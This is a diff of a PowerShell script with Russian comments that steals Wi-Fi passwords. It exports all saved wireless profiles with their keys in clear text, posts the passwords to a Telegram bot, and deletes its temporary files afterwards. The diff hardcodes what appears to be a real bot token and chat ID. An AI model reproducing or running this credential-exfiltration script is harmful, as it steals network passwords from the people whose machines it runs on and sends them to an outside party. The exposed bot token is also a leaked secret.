@@ -1,15 +1,13 @@
-param(
-    [Parameter(Mandatory=$true)]
-    [string]$BotToken,
-    [Parameter(Mandatory=$true)]
-    [string]$ChatID
-)
+# Параметры бота Telegram
+$BotToken = "8013680506:AAHzKXQVcb7fE0WYWo_faMCogkHnqPm33ak"  # Замените на ваш токен
+$ChatID = "259082534"                                         # Замените на ваш Chat ID
 
-# Сбор паролей Wi-Fi
+# Создаем временную директорию
 $TempDir = "$env:temp\wifi-passwords"
 New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
 Set-Location $TempDir
 
+# Экспортируем профили Wi-Fi
 netsh wlan export profile key=clear | Out-Null
 
 # Формируем текстовое сообщение с паролями
@@ -35,9 +33,10 @@ $Body = @{
 
 try {
     Invoke-RestMethod -Uri $TelegramAPIUrl -Body $Body -Method Post | Out-Null
+    Write-Host "Сообщение успешно отправлено в Telegram."
 } catch {
-    # Обработка ошибок отправки
+    Write-Host "Ошибка при отправке сообщения: $($_.Exception.Message)"
 }
 
-# Очистка
+# Удаляем временную директорию
 Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
